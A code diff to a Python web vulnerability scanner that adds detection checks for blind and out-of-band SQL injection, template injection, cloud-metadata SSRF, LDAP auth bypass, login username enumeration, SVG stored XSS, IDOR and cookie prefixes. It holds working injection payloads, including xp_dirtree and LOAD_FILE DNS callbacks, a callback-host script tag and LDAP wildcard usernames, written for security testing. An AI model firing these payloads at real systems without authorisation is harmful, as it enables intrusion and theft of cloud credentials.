@@ -13,7 +13,7 @@ from urllib.parse import urlparse, parse_qs
 from core.colors import info, warn, DIM, RESET
 from core.scanner import (
     Finding, _get, _post, _inject, _raw_reflected, SQL_ERRORS, UPLOAD_PATHS, FILE_INPUT_HINT,
-    FORM_RE, ACTION_RE, INPUT_RE,
+    FORM_RE, ACTION_RE, INPUT_RE, _post_form_targets,
 )
 from core.net import ScanBudgetExceeded
 from core.registry import check as register_check
@@ -43,13 +43,14 @@ BOOLEAN_PAIRS = [
     ('" AND "1"="1', '" AND "1"="2'),
 ]
 
-# Time-based: one payload, short sleep (stay fast)
-TIME_PAYLOADS = ["' OR SLEEP(3)-- -", "';SELECT pg_sleep(3)--"]
+# Time-based: one payload per engine, short sleep (stay fast)
+TIME_PAYLOADS = ["' OR SLEEP(3)-- -", "';SELECT pg_sleep(3)--",
+                 "';WAITFOR DELAY '0:0:3'--"]
 TIME_SLEEP = 3.0
 
 SSTI_PAIR = (7719, 7919)  # product computed live (kills FPs)
 # polyglot bundles: 2 engines per request (for speed)
-SSTI_BUNDLES = ["{{A*B}}${A*B}", "#{A*B}<%= A*B %>"]
+SSTI_BUNDLES = ["{{A*B}}${A*B}", "#{A*B}<%= A*B %>", "__${A*B}__[*{A*B}]"]
 
 SSRF_KEYS = {"url", "uri", "redirect", "next", "callback", "webhook",
              "feed", "file", "path", "dest", "domain", "host",
@@ -57,6 +58,12 @@ SSRF_KEYS = {"url", "uri", "redirect", "next", "callback", "webhook",
 SSRF_META_URL = "http://169.254.169.254/latest/meta-data/ami-id"
 SSRF_MARKERS = ["ami-", "instance-id", "meta-data", "computeMetadata",
                 "metadata.google.internal", "placement/availability-zone"]
+# Azure IMDS needs the Metadata header, otherwise it 400s even when reachable.
+AZURE_META_URL = ("http://169.254.169.254/metadata/instance"
+                  "?api-version=2021-02-01")
+AZURE_MARKERS = ["azenvironment", '"compute"', "az environment"]
+# GCP needs Metadata-Flavor and returns a bare numeric instance id.
+GCP_META_URL = "http://metadata.google.internal/computeMetadata/v1/instance/id"
 
 IDOR_RE = re.compile(r"(/api/[\w\-/]*?/)(\d+)([/?#]|$)", re.I)
 # Only identifier-like names are tested (paging params
@@ -84,11 +91,12 @@ def _bodies_differ(b1: str | None, b2: str | None) -> bool:
 PP_PAYLOADS = ["__proto__[gashpp]=1", "constructor[prototype][gashpp]=1"]
 
 UPLOAD_BYPASS_NAMES = [
-    "gash_probe.txt",        # kontrol: endpoint calisiyor mu?
-    "gash_probe.php",        # kontrol: duz php kabul mu? (dogrudan kritik)
-    "gash_probe.phtml",      # alternatif PHP handler
-    "gash_probe.php5",       # eski handler
-    "gash_probe.png.php",    # cift uzanti
+    "gash_probe.txt",        # control: is the endpoint alive?
+    "gash_probe.php",        # control: plain php accepted? (direct critical)
+    "gash_probe.phtml",      # alternate PHP handler
+    "gash_probe.php5",       # legacy handler
+    "gash_probe.png.php",    # double extension
+    "gash_probe.svg",        # script-carrying image (stored XSS proof)
 ]
 UPLOAD_OK_HINT = re.compile(r"upload|success|\bok\b|done|saved|file", re.I)
 UPLOAD_BLOCK_HINT = re.compile(r"block|forbidden|not allowed|invalid|denied|error", re.I)
@@ -156,13 +164,13 @@ def _method_re():
     return _METHOD_RE
 
 
-# ---------- 1. gelismis SQLi ----------
+# ---------- 1. advanced SQLi ----------
 
 @register_check("sqli-blind", "Boolean-blind + encoding bypass + time-based", order=10)
 def test_sqli_blind(session, urls: list[str], timeout: int,
                     verbose: bool = False, deep: bool = True,
-                    threads: int = 10) -> list[Finding]:
-    """Boolean-blind diferansiyel + encoding WAF-bypass. Time-based deep'te."""
+                    threads: int = 10, oob=None) -> list[Finding]:
+    """Boolean-blind differential + encoding WAF-bypass. Time-based in deep."""
     from concurrent.futures import ThreadPoolExecutor
     out: list[Finding] = []
 
@@ -210,6 +218,33 @@ def test_sqli_blind(session, urls: list[str], timeout: int,
         if found:
             return found
 
+        # -- UNION column-count differential: ORDER BY 1 is valid SQL, while
+        # ORDER BY 100 errors out unless the query has 100+ columns. A status
+        # flip (or a big body change with the valid one matching baseline)
+        # means the sort clause reached the database.
+        gv = _get(session, _inject(u, " ORDER BY 1-- -"), timeout)
+        gb = _get(session, _inject(u, " ORDER BY 100-- -"), timeout)
+        if gv and gb:
+            vs, vb = gv[0], len(gv[1] or "")
+            bs, bb = gb[0], len(gb[1] or "")
+            lb = len(base_body or "")
+            valid_same = vs == base_status and abs(vb - lb) <= max(30, lb // 20)
+            big_differs = (bs != vs) or (abs(bb - vb) > max(100, vb // 10))
+            if valid_same and big_differs:
+                found.append(Finding(
+                    title="Possible SQL Injection (ORDER BY differential)",
+                    severity="CRITICAL",
+                    url=_inject(u, " ORDER BY 100-- -"),
+                    detail=f"ORDER BY 1 matches baseline ({vs}/{vb}B) but "
+                           f"ORDER BY 100 diverges ({bs}/{bb}B)",
+                    evidence=f"{vs}/{vb}B vs {bs}/{bb}B",
+                    confidence="Medium",))
+                if verbose:
+                    print(warn(f"    [!] SQLi ORDER BY: {u}"))
+                return found
+        if found:
+            return found
+
         # -- encoding WAF-bypass: raw ' is clean but encoded fires
         for enc in encoded_variants("'"):
             got = _get(session, _inject(u, enc), timeout)
@@ -248,7 +283,7 @@ def test_sqli_blind(session, urls: list[str], timeout: int,
             base_max = max(base_dt1, base_dt2)
             if base_max > 2.0:
                 return None  # already-slow site, timing is unreliable
-            for p in TIME_PAYLOADS[:2]:  # MySQL SLEEP + pg_sleep
+            for p in TIME_PAYLOADS:  # MySQL SLEEP + pg_sleep + MSSQL WAITFOR
                 inj = _inject(u, p)
                 t1 = time.time()
                 got = _get(session, inj, timeout + 5)
@@ -272,10 +307,41 @@ def test_sqli_blind(session, urls: list[str], timeout: int,
                         confidence="Medium",)
             return None
 
-        for u in urls[:5]:
-            f = _tprobe(u)
-            if f:
-                out.append(f)
+        from core.spinner import spin
+        with spin("  [*] Time-based probes (each sleeps seconds)...",
+                  enabled=not verbose):
+            for u in urls[:5]:
+                f = _tprobe(u)
+                if f:
+                    out.append(f)
+
+    # -- OOB SQLi: fire-and-forget DNS exfiltration, proven by callback.
+    # MySQL UNC needs a Windows host + FILE privilege; MSSQL xp_dirtree
+    # needs stacked queries. Both conditional — silence on a miss.
+    if oob is not None and deep:
+        from core.oob import new_token
+        for u in urls[:3]:
+            token = new_token()
+            host = f"{token}.{oob.session_domain}"
+            payloads = [
+                "' AND (SELECT LOAD_FILE(CONCAT(CHAR(92,92),"
+                f"'{host}',CHAR(92,120))))-- -",
+                f"';EXEC master..xp_dirtree '//{host}/x'--",
+            ]
+            placed = False
+            for payload in payloads:
+                try:
+                    placed = _get(session, _inject(u, payload),
+                                  timeout) is not None
+                except ScanBudgetExceeded:
+                    raise
+                except Exception:
+                    pass
+                if placed:
+                    break
+            if placed:
+                oob.pending.append({"kind": "sqli", "target": u,
+                                    "token": token})
     return out
 
 
@@ -283,7 +349,9 @@ def test_sqli_blind(session, urls: list[str], timeout: int,
 
 @register_check("ssti", "SSTI template injection", order=10)
 def test_ssti(session, urls: list[str], timeout: int,
-             verbose: bool = False, threads: int = 10) -> list[Finding]:
+             verbose: bool = False, threads: int = 10,
+             pages: dict | None = None, base: str = "",
+             deep: bool = True) -> list[Finding]:
     a, b = SSTI_PAIR
     expected = str(a * b)
     from concurrent.futures import ThreadPoolExecutor
@@ -317,6 +385,34 @@ def test_ssti(session, urls: list[str], timeout: int,
         for f in ex.map(_probe, targets):
             if f:
                 out.append(f)
+
+    if deep:
+        for action, field, filler in _post_form_targets(pages, base):
+            base_r = _post(session, action, timeout,
+                           data={**filler, field: "gash1"})
+            if base_r and expected in (base_r.text or ""):
+                continue
+            for bundle in SSTI_BUNDLES:
+                payload = bundle.replace("A", str(a)).replace("B", str(b))
+                r = _post(session, action, timeout,
+                          data={**filler, field: payload})
+                if not r or expected not in (r.text or ""):
+                    continue
+                confirm = _post(session, action, timeout,
+                                data={**filler, field: payload})
+                if not (confirm and expected in (confirm.text or "")):
+                    continue
+                if verbose:
+                    print(warn(f"    [!] SSTI (POST {field}): {action}"))
+                out.append(Finding(
+                    title="Possible SSTI (Template Injection)", severity="CRITICAL",
+                    url=action,
+                    detail=f"Template expression evaluated to {expected} via POST body",
+                    evidence=expected,
+                    confidence="High",))
+                break
+            if len(out) >= 6:
+                break
     return out
 
 
@@ -345,17 +441,18 @@ def test_ssrf(session, urls: list[str], timeout: int,
             inj = urlunparse((p.scheme, p.netloc, p.path, p.params,
                               urlencode({key: oob.url_for(token)}), p.fragment))
             try:
-                _get(session, inj, timeout)
+                placed = _get(session, inj, timeout) is not None
             except ScanBudgetExceeded:
                 raise
             except Exception:
-                pass
-            oob.pending.append({"kind": "ssrf", "target": u, "token": token})
+                placed = False
+            if placed:
+                oob.pending.append({"kind": "ssrf", "target": u, "token": token})
         # baseline: a page that always mentions cloud markers (e.g. AWS docs)
         # would fake a hit on every probe — rule that out first.
         base_got = _get(session, u, timeout)
         base_low = ((base_got[1] if base_got else "") or "").lower()
-        base_has_marker = any(m in base_low for m in SSRF_MARKERS)
+        base_has_marker = any(m in base_low for m in SSRF_MARKERS + AZURE_MARKERS)
         for key in keys[:2]:
             p = urlparse(u)
             inj = urlunparse((p.scheme, p.netloc, p.path, p.params,
@@ -374,8 +471,42 @@ def test_ssrf(session, urls: list[str], timeout: int,
                     confidence="High",))
                 if verbose:
                     print(warn(f"    [!] SSRF: {inj}"))
-            else:
-                found.append(("INFO", u, key))  # asagida max 3'e inir
+                continue
+            az_inj = urlunparse((p.scheme, p.netloc, p.path, p.params,
+                                 urlencode({key: AZURE_META_URL}), p.fragment))
+            az = _get(session, az_inj, timeout, headers={"Metadata": "true"})
+            if az:
+                az_low = (az[1] or "").lower()
+                az_hit = next((m for m in AZURE_MARKERS if m in az_low), None)
+                if az_hit and not base_has_marker:
+                    found.append(Finding(
+                        title="Possible SSRF (cloud metadata)", severity="CRITICAL",
+                        url=az_inj,
+                        detail=f"Parameter '{key}' returned an Azure metadata "
+                               f"marker: '{az_hit}'",
+                        evidence=az_hit,
+                        confidence="High",))
+                    if verbose:
+                        print(warn(f"    [!] SSRF (Azure): {az_inj}"))
+                    continue
+            gcp_inj = urlunparse((p.scheme, p.netloc, p.path, p.params,
+                                  urlencode({key: GCP_META_URL}), p.fragment))
+            gcp = _get(session, gcp_inj, timeout,
+                       headers={"Metadata-Flavor": "Google"})
+            if gcp and gcp[0] == 200:
+                gcp_body = (gcp[1] or "").strip()
+                if re.fullmatch(r"\d{4,}", gcp_body) \
+                        and gcp_body not in (base_got[1] or ""):
+                    found.append(Finding(
+                        title="Possible SSRF (cloud metadata)", severity="CRITICAL",
+                        url=gcp_inj,
+                        detail=f"Parameter '{key}' returned a GCP instance id",
+                        evidence=gcp_body[:20],
+                        confidence="High",))
+                    if verbose:
+                        print(warn(f"    [!] SSRF (GCP): {gcp_inj}"))
+                    continue
+            found.append(("INFO", u, key))  # capped below at 3
         return found
 
     info_left = 3
@@ -402,7 +533,7 @@ def test_ssrf(session, urls: list[str], timeout: int,
 
 @register_check("idor", "IDOR/BOLA API object differential", order=10)
 def test_idor(session, pages: dict, base: str, timeout: int,
-              verbose: bool = False) -> list[Finding]:
+              verbose: bool = False, session_b=None) -> list[Finding]:
     from urllib.parse import urljoin
     cands = []
     for html in (pages or {}).values():
@@ -424,6 +555,18 @@ def test_idor(session, pages: dict, base: str, timeout: int,
         if g1[0] == 200 and g2[0] == 200:
             l1, l2 = len(g1[1] or ""), len(g2[1] or "")
             if _bodies_differ(g1[1], g2[1]):
+                if _cross_session_confirm(session_b, sib, g2[1], timeout):
+                    out.append(Finding(
+                        title="Confirmed IDOR / BOLA (cross-session)",
+                        severity="CRITICAL",
+                        url=sib,
+                        detail=f"/{nid} -> /{nid + 1} readable by a second user "
+                               f"({l1}B vs {l2}B); object auth is missing",
+                        evidence=f"{l1}B vs {l2}B",
+                        confidence="High",))
+                    if verbose:
+                        print(warn(f"    [!] IDOR confirmed: {sib}"))
+                    continue
                 out.append(Finding(
                     title="Possible IDOR / BOLA (single session)", severity="MEDIUM",
                     url=sib,
@@ -436,7 +579,25 @@ def test_idor(session, pages: dict, base: str, timeout: int,
     return out
 
 
-# ---------- 5. Prototype Pollution yuzeyi ----------
+def _cross_session_confirm(session_b, sib: str, sib_body: str | None,
+                           timeout: int) -> bool:
+    """Does a second user see the same object? True = access control missing.
+
+    A 401/403/login for user B means the object IS protected — that keeps
+    the single-session heuristic untouched instead of upgrading it.
+    """
+    if session_b is None:
+        return False
+    g = _get(session_b, sib, timeout)
+    if not g or g[0] != 200:
+        return False
+    lb, l2 = len(g[1] or ""), len(sib_body or "")
+    if max(lb, l2) == 0:
+        return False
+    return abs(lb - l2) <= max(30, l2 // 5)
+
+
+# ---------- 5. Prototype Pollution surface ----------
 
 @register_check("protopollution", "Prototype Pollution reflection surface", order=10)
 def test_proto_pollution(session, urls: list[str], timeout: int,
@@ -546,25 +707,30 @@ def test_stored_xss(session, pages: dict, base: str, timeout: int,
                 token = f"gashblind{int(time.time()) % 100000}"
                 blind = f"\"><script src=https://{host}/{token}.js>"
             blind_data = {i: blind for i in fuzzable}
+            placed = False
             try:
                 if f["method"] == "POST":
                     if deep:
-                        _post(session, f["action"], timeout, data=blind_data)
+                        placed = _post(session, f["action"], timeout,
+                                       data=blind_data) is not None
                     else:
                         continue
                 else:
                     from urllib.parse import urlencode
                     sep = "&" if "?" in f["action"] else "?"
-                    _get(session, f["action"] + sep + urlencode(blind_data),
-                         timeout)
+                    placed = _get(session, f["action"] + sep + urlencode(blind_data),
+                                  timeout) is not None
             except ScanBudgetExceeded:
                 raise
             except Exception:
                 pass
             if oob is not None:
-                oob.pending.append({"kind": "xss", "target": f["action"],
-                                    "token": token})
+                if placed:
+                    oob.pending.append({"kind": "xss", "target": f["action"],
+                                        "token": token})
                 continue
+            if not placed:
+                continue  # degraded request: don't claim a placement
             out.append(Finding(
                 title="Blind XSS canary placed (unverified)",
                 severity="LOW",
@@ -592,6 +758,39 @@ LOGIN_INPUT_RE = re.compile(
 LOGIN_INPUT_RE2 = re.compile(
     r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']?(\w+)["\']?', re.I)
 
+LOGIN_USER_HINTS = ["invalid username", "unknown user", "user not found",
+                    "no such user", "username does not exist",
+                    "account does not exist"]
+LOGIN_PASS_HINTS = ["invalid password", "wrong password",
+                    "incorrect password"]
+
+
+def _login_fields(chunk: str) -> tuple[dict[str, str], dict[str, str]]:
+    """Parse a login form chunk -> (fields name->type, hidden name->value)."""
+    fields: dict[str, str] = {}
+    for mm2 in list(LOGIN_INPUT_RE.finditer(chunk)) + \
+               [(b, a) for a, b in LOGIN_INPUT_RE2.findall(chunk)]:
+        t, n = mm2 if isinstance(mm2, tuple) else (mm2.group(1), mm2.group(2))
+        fields[n] = (t or "text").lower()
+    hidden_vals: dict[str, str] = {}
+    for hm in re.finditer(
+            r'<input[^>]*type=["\']?hidden["\']?[^>]*>', chunk, re.I):
+        tag = hm.group(0)
+        nm = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
+        vm = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
+        if nm:
+            hidden_vals[nm.group(1)] = vm.group(1) if vm else ""
+    return fields, hidden_vals
+
+
+def _scrub_hidden(body: str, hidden_vals: dict[str, str]) -> str:
+    """Blank rotating CSRF tokens so length comparisons stay meaningful."""
+    out = body or ""
+    for v in (hidden_vals or {}).values():
+        if v and len(v) >= 8:
+            out = out.replace(v, "")
+    return out
+
 
 @register_check("sqli-login", "Login form SQLi auth-bypass differential", order=10, deep_only=True)
 def test_sqli_login(session, pages: dict, base: str, timeout: int,
@@ -612,20 +811,8 @@ def test_sqli_login(session, pages: dict, base: str, timeout: int,
             method = (mm.search(full).group(1).upper() if mm.search(full) else "GET")
             if method != "POST":
                 continue
-            fields: dict[str, str] = {}  # name -> type
-            for mm2 in list(LOGIN_INPUT_RE.finditer(chunk)) + \
-                       [(b, a) for a, b in LOGIN_INPUT_RE2.findall(chunk)]:
-                t, n = mm2 if isinstance(mm2, tuple) else (mm2.group(1), mm2.group(2))
-                fields[n] = (t or "text").lower()
+            fields, hidden_vals = _login_fields(chunk)
             if any(t == "password" for t in fields.values()):
-                hidden_vals: dict[str, str] = {}
-                for hm in re.finditer(
-                        r'<input[^>]*type=["\']?hidden["\']?[^>]*>', chunk, re.I):
-                    tag = hm.group(0)
-                    nm = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
-                    vm = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
-                    if nm:
-                        hidden_vals[nm.group(1)] = vm.group(1) if vm else ""
                 forms.append({"action": action, "fields": fields,
                               "hidden": hidden_vals})
     for f in forms[:3]:
@@ -685,7 +872,147 @@ def test_sqli_login(session, pages: dict, base: str, timeout: int,
     return out
 
 
-# ---------- 12. WAF tespiti (pasif fingerprint) ----------
+@register_check("login-enum", "Login username enumeration differential", order=10, deep_only=True)
+def test_login_enum(session, pages: dict, base: str, timeout: int,
+                    verbose: bool = False) -> list[Finding]:
+    """Same wrong password, existing-vs-random username. Different errors
+    (or sizes) mean the app tells usernames apart — brute-force fuel.
+    Deep only: failed logins touch lockout counters."""
+    from urllib.parse import urljoin
+    out: list[Finding] = []
+    forms = []
+    for purl, html in (pages or {}).items():
+        for m in FORM_RE.finditer(html or ""):
+            chunk, full = m.group(1), m.group(0)
+            if "password" not in full.lower():
+                continue
+            am = ACTION_RE.search(full)
+            action = urljoin(base + "/", (am.group(1) if am else "") or "/")
+            mm = _method_re()
+            method = (mm.search(full).group(1).upper() if mm.search(full) else "GET")
+            if method != "POST":
+                continue
+            fields, hidden_vals = _login_fields(chunk)
+            if any(t == "password" for t in fields.values()):
+                forms.append({"action": action, "fields": fields,
+                              "hidden": hidden_vals})
+    for f in forms[:2]:
+        users = [n for n, t in f["fields"].items()
+                 if t in ("text", "search", "email", "username", "login", "user", "")]
+        passes = [n for n, t in f["fields"].items() if t == "password"]
+        if not users or not passes:
+            continue
+        submit = {n: "Login" for n, t in f["fields"].items()
+                  if t in ("submit", "image", "button")}
+        rnd = f"gashnouser{int(time.time()) % 100000}"
+
+        def mk(uname: str) -> dict:
+            return {**{u: uname for u in users[:1]},
+                    **{p: "WrongPass123!" for p in passes[:1]},
+                    **submit,
+                    **{n: "1" for n in f["fields"] if n not in users[:1]
+                       and n not in passes[:1] and n not in submit
+                       and n not in f.get("hidden", {})},
+                    **f.get("hidden", {})}
+
+        ra = _post(session, f["action"], timeout, data=mk("admin"))
+        rb = _post(session, f["action"], timeout, data=mk(rnd))
+        if not ra or not rb:
+            continue
+        la = _scrub_hidden(ra.text or "", f.get("hidden", "")).lower()
+        lb = _scrub_hidden(rb.text or "", f.get("hidden", "")).lower()
+        if any(m in la for m in LOGIN_OK) or any(m in lb for m in LOGIN_OK):
+            continue  # someone actually got in — not an enum signal
+        uh_a = any(m in la for m in LOGIN_USER_HINTS)
+        uh_b = any(m in lb for m in LOGIN_USER_HINTS)
+        ph_a = any(m in la for m in LOGIN_PASS_HINTS)
+        ph_b = any(m in lb for m in LOGIN_PASS_HINTS)
+        if (uh_a or uh_b or ph_a or ph_b) and ((uh_a, ph_a) != (uh_b, ph_b)):
+            out.append(Finding(
+                title="Login username enumeration", severity="LOW",
+                url=f["action"],
+                detail="Existing vs random username get different errors; "
+                       "usernames are enumerable",
+                evidence="differential error text",
+                confidence="Medium",))
+        elif abs(len(la) - len(lb)) > 300:
+            out.append(Finding(
+                title="Login username enumeration", severity="LOW",
+                url=f["action"],
+                detail=f"Existing vs random username differ by "
+                       f"{abs(len(la) - len(lb))}B (tokens scrubbed)",
+                evidence=f"{len(la)}B vs {len(lb)}B",
+                confidence="Low",))
+        if verbose and out and out[-1].url == f["action"]:
+            print(warn(f"    [!] Login user-enum: {f['action']}"))
+    return out
+
+
+LDAP_BYPASS_USERS = ["*", "admin*", "*)(", "*)(uid=*))("]
+
+
+@register_check("ldap-injection", "LDAP wildcard auth bypass", order=10, deep_only=True)
+def test_ldap_injection(session, pages: dict, base: str, timeout: int,
+                        verbose: bool = False) -> list[Finding]:
+    """LDAP wildcard probes on login forms: `*` as the username with a wrong
+    password. A login trace means the filter is concatenated, not escaped.
+    Deep only: even failed logins touch lockout counters."""
+    from urllib.parse import urljoin
+    out: list[Finding] = []
+    forms = []
+    for purl, html in (pages or {}).items():
+        for m in FORM_RE.finditer(html or ""):
+            chunk, full = m.group(1), m.group(0)
+            if "password" not in full.lower():
+                continue
+            am = ACTION_RE.search(full)
+            action = urljoin(base + "/", (am.group(1) if am else "") or "/")
+            mm = _method_re()
+            method = (mm.search(full).group(1).upper() if mm.search(full) else "GET")
+            if method != "POST":
+                continue
+            fields, hidden_vals = _login_fields(chunk)
+            if any(t == "password" for t in fields.values()):
+                forms.append({"action": action, "fields": fields,
+                              "hidden": hidden_vals})
+    for f in forms[:2]:
+        users = [n for n, t in f["fields"].items()
+                 if t in ("text", "search", "email", "username", "login", "user", "")]
+        passes = [n for n, t in f["fields"].items() if t == "password"]
+        if not users or not passes:
+            continue
+        submit = {n: "Login" for n, t in f["fields"].items()
+                  if t in ("submit", "image", "button")}
+        for wild in LDAP_BYPASS_USERS:
+            data = {**{u: wild for u in users[:1]},
+                    **{p: "WrongPass123!" for p in passes[:1]},
+                    **submit,
+                    **{n: "1" for n in f["fields"] if n not in users[:1]
+                       and n not in passes[:1] and n not in submit
+                       and n not in f.get("hidden", {})},
+                    **f.get("hidden", {})}
+            r = _post(session, f["action"], timeout, data=data)
+            if not r:
+                continue
+            low = (r.text or "").lower()
+            markers = [m for m in LOGIN_OK if m in low]
+            corroborate = (r.url != f["action"] or r.status_code in (301, 302))
+            if len(markers) >= 2 or (markers and corroborate):
+                out.append(Finding(
+                    title="Possible LDAP injection (auth bypass)",
+                    severity="CRITICAL",
+                    url=f["action"],
+                    detail=f"Wildcard username '{wild}' logged in "
+                           f"({', '.join(markers[:3])})",
+                    evidence=wild,
+                    confidence="Medium",))
+                if verbose:
+                    print(warn(f"    [!] LDAP bypass: {f['action']}"))
+                break
+    return out
+
+
+# ---------- 12. WAF fingerprint (passive) ----------
 
 WAF_SIGNS = [
     ("Cloudflare", ["cf-ray", "cf-cache-status", "__cfduid", "cf_clearance",
@@ -716,7 +1043,7 @@ def detect_waf(headers: dict, cookie_names: list[str]) -> str | None:
 @register_check("waf-detect", "WAF fingerprint (passive note)", order=5)
 def test_waf_detect(session, headers: dict, base: str,
                     verbose: bool = False) -> list[Finding]:
-    """Istek atmaz: base header + oturum cookie'lerine bakar."""
+    """No requests: reads base headers + session cookies."""
     try:
         jar = getattr(session, "cookies", None)
         cnames = [c.name for c in list(jar)] if jar else []
@@ -740,7 +1067,8 @@ def test_waf_detect(session, headers: dict, base: str,
 
 @register_check("idor-param", "IDOR query parameter (id/user_id)", order=10)
 def test_idor_param(session, urls: list[str], timeout: int,
-                    verbose: bool = False, threads: int = 10) -> list[Finding]:
+                    verbose: bool = False, threads: int = 10,
+                    session_b=None) -> list[Finding]:
     """Integer-valued query params: N -> N+1 differential."""
     from concurrent.futures import ThreadPoolExecutor
     from urllib.parse import urlencode, urlunparse
@@ -767,6 +1095,17 @@ def test_idor_param(session, urls: list[str], timeout: int,
             if g1[0] == 200 and g2[0] == 200:
                 l1, l2 = len(g1[1] or ""), len(g2[1] or "")
                 if _bodies_differ(g1[1], g2[1]):
+                    if _cross_session_confirm(session_b, sib, g2[1], timeout):
+                        if verbose:
+                            print(warn(f"    [!] IDOR-param confirmed: {sib}"))
+                        return Finding(
+                            title="Confirmed IDOR / BOLA (cross-session)",
+                            severity="CRITICAL",
+                            url=sib,
+                            detail=f"?{key}={n} -> ={n + 1} readable by a second user "
+                                   f"({l1}B vs {l2}B); object auth is missing",
+                            evidence=f"{l1}B vs {l2}B",
+                            confidence="High",)
                     if verbose:
                         print(warn(f"    [!] IDOR-param: {sib}"))
                     return Finding(
@@ -786,7 +1125,7 @@ def test_idor_param(session, urls: list[str], timeout: int,
     return out
 
 
-# ---------- 11. Cookie bayrak denetimi ----------
+# ---------- 11. Cookie flag audit ----------
 
 @register_check("cookie-flags", "Cookie HttpOnly/Secure/SameSite audit", order=10)
 def test_cookie_flags(session, base: str, timeout: int,
@@ -817,8 +1156,34 @@ def test_cookie_flags(session, base: str, timeout: int,
                 evidence=c.name,
                 confidence="High",))
             if verbose:
-                print(warn(f"    [!] Cookie: {c.name} -> {', '.join(missing)} eksik"))
-    return out[:3]
+                print(warn(f"    [!] Cookie: {c.name} -> {', '.join(missing)} missing"))
+        # __Host-/__Secure- prefixes are a browser-enforced contract:
+        # breaking it silently drops the cookie's protection.
+        name = c.name or ""
+        if name.startswith("__Host-") and (
+                not getattr(c, "secure", False) or "/" not in
+                str(getattr(c, "path", "/") or "/")):
+            out.append(Finding(
+                title="Weak cookie flags", severity="LOW",
+                url=base + "/",
+                detail=f"Cookie '{name}' uses the __Host- prefix without "
+                       "Secure + Path=/ + host-only; browsers ignore the prefix",
+                evidence=name,
+                confidence="High",))
+            if verbose:
+                print(warn(f"    [!] Cookie prefix broken: {name}"))
+        elif name.startswith("__Secure-") and https \
+                and not getattr(c, "secure", False):
+            out.append(Finding(
+                title="Weak cookie flags", severity="LOW",
+                url=base + "/",
+                detail=f"Cookie '{name}' uses the __Secure- prefix without "
+                       "the Secure flag",
+                evidence=name,
+                confidence="High",))
+            if verbose:
+                print(warn(f"    [!] Cookie prefix broken: {name}"))
+    return out[:4]
 
 
 @register_check("upload-rce", "Upload filter bypass (benign content, active POST)", order=15, deep_only=True)
@@ -827,7 +1192,7 @@ def test_upload_rce(session, base: str, html: str, timeout: int,
     """Active POST only in deep mode; content always harmless text."""
     if not deep:
         return []
-    # once endpoint bul: formdaki file input ya da bilinen yollar
+    # find endpoints first: file inputs in forms, or known paths
     endpoints = []
     for m in FORM_RE.finditer(html or ""):
         if FILE_INPUT_HINT.search(m.group(0) or ""):
@@ -846,12 +1211,15 @@ def test_upload_rce(session, base: str, html: str, timeout: int,
     print(info(f"  [*] Trying upload filter bypass ({len(endpoints)} endpoints)..."))
     out: list[Finding] = []
     content = b"GASH benign probe - not executable - text only"
+    svg_content = (b'<svg xmlns="http://www.w3.org/2000/svg">'
+                   b'<script>/*gashsvgmarker*/</script></svg>')
     for ep in endpoints:
         results: dict[str, bool] = {}
         disclosed = ""
         for fname in UPLOAD_BYPASS_NAMES:
+            body_bytes = svg_content if fname.endswith(".svg") else content
             r = _post(session, ep, timeout,
-                      files={"file": (fname, content, "text/plain")},
+                      files={"file": (fname, body_bytes, "text/plain")},
                       data={"submit": "Upload"})
             if not r:
                 results[fname] = False
@@ -899,26 +1267,46 @@ def test_upload_rce(session, base: str, html: str, timeout: int,
                 detail="Harmless .txt file accepted; extension filter missing/weak",
                 evidence="gash_probe.txt",
                 confidence="Medium",))
+        # SVG proof: if the script-carrying file is served back unmodified,
+        # the upload is not just accepted — it executes.
+        if results.get("gash_probe.svg") and disclosed:
+            from urllib.parse import urljoin as _uj
+            try:
+                g = _get(session, _uj(ep + "/", disclosed), timeout)
+            except ScanBudgetExceeded:
+                raise
+            except Exception:
+                g = None
+            if g and "gashsvgmarker" in (g[1] or ""):
+                if verbose:
+                    print(warn(f"    [!] Stored XSS via SVG: {disclosed}"))
+                out.append(Finding(
+                    title="Possible Stored XSS (SVG upload)", severity="CRITICAL",
+                    url=_uj(ep + "/", disclosed),
+                    detail="Uploaded SVG with script content is served back "
+                           "unmodified (marker reflected)",
+                    evidence="gashsvgmarker",
+                    confidence="High",))
     return out
 
 
 # ---------- 8. Smart-tech fingerprint ----------
 
 def smart_tech_paths(html: str, headers: dict) -> tuple[list[str], list[str]]:
-    """(teknolojiler, ek dir-brute yollari). Istek atmaz, pasif."""
+    """(technologies, extra dir-brute paths). No requests, passive."""
     blob = ((html or "")[:6000] + " " + " ".join(
         f"{k}: {v}" for k, v in (headers or {}).items())).lower()
     techs = [t for t, marks in TECH_MARKERS if any(m in blob for m in marks)]
     extra: list[str] = []
     for t in techs:
         extra += SMART_PATHS.get(t, [])
-    extra += SMART_PATHS["backup"][:6]  # yedekler herkeste aranir
+    extra += SMART_PATHS["backup"][:6]  # backups probed everywhere
     return sorted(set(techs)), list(dict.fromkeys(extra))
 
 
 @register_check("smart-tech", "Tech fingerprint + targeted paths", order=21)
 def smart_tech(ctx: dict) -> list[Finding]:
-    """Pasif: ctx'e techs + extra_paths yazar. Istek atmaz."""
+    """Passive: writes techs + extra_paths into ctx. Makes no requests."""
     html, headers = ctx.get("html", ""), ctx.get("headers") or {}
     techs, extra = smart_tech_paths(html, headers)
     ctx["techs"] = techs
